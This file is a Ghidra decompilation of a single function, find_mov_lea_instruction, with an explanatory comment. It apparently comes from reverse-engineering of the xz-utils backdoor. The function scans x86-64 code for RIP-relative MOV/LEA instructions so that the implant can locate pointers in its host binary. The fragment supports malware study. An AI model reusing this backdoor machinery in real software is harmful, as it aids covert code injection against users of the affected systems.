// /home/kali/xzre-ghidra/xzregh/100D40_find_mov_lea_instruction.c
// Function: find_mov_lea_instruction @ 0x100D40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_lea_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: Scans a code range for MOV/LEA instructions that move pointer values between registers and memory.
 * Each decoded instruction must expose the expected RIP/base-plus-displacement addressing form, satisfy the caller’s `is_64bit_operand` requirement via the REX bits (unless the caller is hunting for stores), and then match either the shared LEA opcode (`0x10d`) or the directional MOV opcode selected by `load_flag` (`mov reg,[mem]` vs `mov [mem],reg`).
 * When those checks pass the populated `dctx` is left pointing at the instruction so later pointer-chasing code can read back the operands.
 */

#include "xzre_types.h"

BOOL find_mov_lea_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  BOOL bVar5;
  dasm_ctx_t scratch_ctx;
  
  pdVar4 = &scratch_ctx;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)&pdVar4->instruction = 0;
    pdVar4 = (dasm_ctx_t *)((long)&pdVar4->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if (BVar2 != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      iVar1 = *(int *)(dctx->opcode_window + 3);
      if (iVar1 == 0x10d) {
        return TRUE;
      }
      if (load_flag == FALSE) {
        bVar5 = iVar1 == 0x109;
      }
      else {
        bVar5 = iVar1 == 0x10b;
      }
      if (bVar5) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

